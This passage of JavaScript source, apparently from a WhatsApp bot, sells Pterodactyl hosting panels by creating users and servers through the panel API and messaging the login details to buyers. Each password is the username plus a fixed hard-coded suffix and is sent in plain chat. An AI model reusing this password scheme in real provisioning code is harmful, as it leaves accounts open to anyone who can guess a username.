"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*Success create panel ✅*`+readmore+`
┏━  ⬣『 *ACCOUNT DATA*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${xdate}
┃ *O'clock :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username and Password Have Been Sent
To @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp4gb': 
case '4gb':
case 'panel4gb': {
if (!isPremium && !isCreator) return replyprem(mess.prem)
let t = text.split(',');
if (t.length < 2) return newReply(`Example : ${prefix+command} username,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender: t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net': m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "4050"
let cpu = "120"
let disk = "4050"
let email = username + "@gmail.com"
let password = username + "72bdd9"
if (!u) return
let d = (await ToxxicTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${xdate}${xtime} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
newReply(`_Creating a Server for ${pushname}_`)
let ctf = `
*Hi @${u.split`@`[0]} Here's Your Panel Data*
*FROM @${m?.sender.split('@')[0]}* `+readmore+`
┏━ ⬣『 *ACCOUNT DATA*』⬣ ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
*CPU :*${cpu}%
┃ *Created :* ${pushname}
Day :* ${xdate}
┃ *Hour :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *CAN CHANGE SC*
- *BOT CAN BE ON 24 HOURS*
- *WEB CLOSE BOT ON*
- *DO NOT WASTE QUOTA*
- *DOES NOT CONSUME HP RAM*
- 15 DAY WARRANTY*

*NOTES:*
- *TAKE GOOD CARE OF YOUR PANEL DATA*
- *OWN ONLY SEND 1X DATA*
- *ENTER GROUP FOR INFO*
- *SS PANEL WITH CP .DONE*
- *HUB ONW IF THERE ARE PROBLEMS*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SPREAD DOMAIN*

*RELATED? DELETED NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b355e4b093846225b74ad.jpg" } }, { upload: ToxxicTechInc.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+By+Toxxic+Boy","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363336528578108@newsletter',
newsletterName: ownername,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await ToxxicTechInc.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*Success create panel ✅*`+readmore+`
┏━  ⬣『 *ACCOUNT DATA*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${xdate}
┃ *O'clock :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username and Password Have Been Sent
To @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp5gb': 
case '5gb':
case 'panel5gb': {
if (!isPremium && !isCreator) return replyprem(mess.prem)
let t = text.split(',');
if (t.length < 2) return newReply(`Example : ${prefix+command} username,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender: t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net': m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "5050"
let cpu = "150"
let disk = "5050"
let email = username + "@gmail.com"
let password = username + "38su4"
if (!u) return
let d = (await ToxxicTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${xdate}${xtime} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
newReply(`_Creating a Server for ${pushname}_`)
let ctf = `
*Hi @${u.split`@`[0]} Here's Your Panel Data*
*FROM @${m?.sender.split('@')[0]}* `+readmore+`
┏━ ⬣『 *ACCOUNT DATA*』⬣ ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
*CPU :*${cpu}%
┃ *Created :* ${pushname}
Day :* ${xdate}
┃ *Hour :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *CAN CHANGE SC*
- *BOT CAN BE ON 24 HOURS*
- *WEB CLOSE BOT ON*
- *DO NOT WASTE QUOTA*
- *DOES NOT CONSUME HP RAM*
- 15 DAY WARRANTY*

*NOTES:*
- *TAKE GOOD CARE OF YOUR PANEL DATA*
- *OWN ONLY SEND 1X DATA*
- *ENTER GROUP FOR INFO*
- *SS PANEL WITH CP .DONE*
- *HUB ONW IF THERE ARE PROBLEMS*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SPREAD DOMAIN*

*RELATED? DELETED NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b355e4b093846225b74ad.jpg" } }, { upload: ToxxicTechInc.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+By+Toxxic+Boy","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363336528578108@newsletter',
newsletterName: ownername,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await ToxxicTechInc.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*Success create panel ✅*`+readmore+`
┏━  ⬣『 *ACCOUNT DATA*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${xdate}
┃ *O'clock :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username and Password Have Been Sent
To @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp6gb': 
case '6gb':
case 'panel6gb': {
if (!isPremium && !isCreator) return replyprem(mess.prem)
let t = text.split(',');
if (t.length < 2) return newReply(`Example : ${prefix+command} username,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender: t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net': m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "6100"
let cpu = "180"
let disk = "6100"
let email = username + "@gmail.com"
let password = username + "72bdd9"
if (!u) return
let d = (await ToxxicTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${xdate}${xtime} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
newReply(`_Creating a Server for ${pushname}_`)
let ctf = `
*Hi @${u.split`@`[0]} Here's Your Panel Data*
*FROM @${m?.sender.split('@')[0]}* `+readmore+`
┏━ ⬣『 *ACCOUNT DATA*』⬣ ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
*CPU :*${cpu}%
┃ *Created :* ${pushname}
Day :* ${xdate}
┃ *Hour :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *CAN CHANGE SC*
- *BOT CAN BE ON 24 HOURS*
- *WEB CLOSE BOT ON*
- *DO NOT WASTE QUOTA*
- *DOES NOT CONSUME HP RAM*
- 15 DAY WARRANTY*

*NOTES:*
- *TAKE GOOD CARE OF YOUR PANEL DATA*
- *OWN ONLY SEND 1X DATA*
- *ENTER GROUP FOR INFO*
- *SS PANEL WITH CP .DONE*
- *HUB ONW IF THERE ARE PROBLEMS*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SPREAD DOMAIN*

*RELATED? DELETED NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b355e4b093846225b74ad.jpg" } }, { upload: ToxxicTechInc.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+By+Toxxic+Boy","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363336528578108@newsletter',
newsletterName: ownername,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await ToxxicTechInc.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*Success create panel ✅*`+readmore+`
┏━  ⬣『 *ACCOUNT DATA*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${xdate}
┃ *O'clock :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username and Password Have Been Sent
To @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp7gb': 
case '7gb':
case 'panel7gb': {
if (!isPremium && !isCreator) return replyprem(mess.prem)
let t = text.split(',');
if (t.length < 2) return newReply(`Example : ${prefix+command} username,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender: t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net': m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "7100"
let cpu = "210"
let disk = "7100"
let email = username + "@gmail.com"
let password = username + "72bdd9"
if (!u) return
let d = (await ToxxicTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${xdate}${xtime} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
newReply(`_Creating a Server for ${pushname}_`)
let ctf = `
*Hi @${u.split`@`[0]} Here's Your Panel Data*
*FROM @${m?.sender.split('@')[0]}* `+readmore+`
┏━ ⬣『 *ACCOUNT DATA*』⬣ ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
*CPU :*${cpu}%
┃ *Created :* ${pushname}
Day :* ${xdate}
┃ *Hour :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *CAN CHANGE SC*
- *BOT CAN BE ON 24 HOURS*
- *WEB CLOSE BOT ON*
- *DO NOT WASTE QUOTA*
- *DOES NOT CONSUME HP RAM*
- 15 DAY WARRANTY*

*NOTES:*
- *TAKE GOOD CARE OF YOUR PANEL DATA*
- *OWN ONLY SEND 1X DATA*
- *ENTER GROUP FOR INFO*
- *SS PANEL WITH CP .DONE*
- *HUB ONW IF THERE ARE PROBLEMS*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SPREAD DOMAIN*

*RELATED? DELETED NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b355e4b093846225b74ad.jpg" } }, { upload: ToxxicTechInc.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+By+Toxxic+Boy","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363336528578108@newsletter',
newsletterName: ownername,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await ToxxicTechInc.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*Success create panel ✅*`+readmore+`
┏━  ⬣『 *ACCOUNT DATA*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${xdate}
┃ *O'clock :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username and Password Have Been Sent
To @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp8gb': 
case '8gb':
case 'panel8gb': {
if (!isPremium && !isCreator) return replyprem(mess.prem)
let t = text.split(',');
if (t.length < 2) return newReply(`Example : ${prefix+command} username,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender: t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net': m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "8100"
let cpu = "240"
let disk = "8100"
let email = username + "@gmail.com"
let password = username + "38dy79"
if (!u) return
let d = (await ToxxicTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${xdate}${xtime} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
newReply(`_Creating a Server for ${pushname}_`)
let ctf = `
*Hi @${u.split`@`[0]} Here's Your Panel Data*
*FROM @${m?.sender.split('@')[0]}* `+readmore+`
┏━ ⬣『 *ACCOUNT DATA*』⬣ ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
*CPU :*${cpu}%
┃ *Created :* ${pushname}
Day :* ${xdate}
┃ *Hour :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *CAN CHANGE SC*
- *BOT CAN BE ON 24 HOURS*
- *WEB CLOSE BOT ON*
- *DO NOT WASTE QUOTA*
- *DOES NOT CONSUME HP RAM*
- 15 DAY WARRANTY*

*NOTES:*
- *TAKE GOOD CARE OF YOUR PANEL DATA*
- *OWN ONLY SEND 1X DATA*
- *ENTER GROUP FOR INFO*
- *SS PANEL WITH CP .DONE*
- *HUB ONW IF THERE ARE PROBLEMS*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SPREAD DOMAIN*

*RELATED? DELETED NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b355e4b093846225b74ad.jpg" } }, { upload: ToxxicTechInc.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+By+Toxxic+Boy","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363336528578108@newsletter',
newsletterName: ownername,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await ToxxicTechInc.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*Success create panel ✅*`+readmore+`
┏━  ⬣『 *ACCOUNT DATA*  』⬣  ━┓
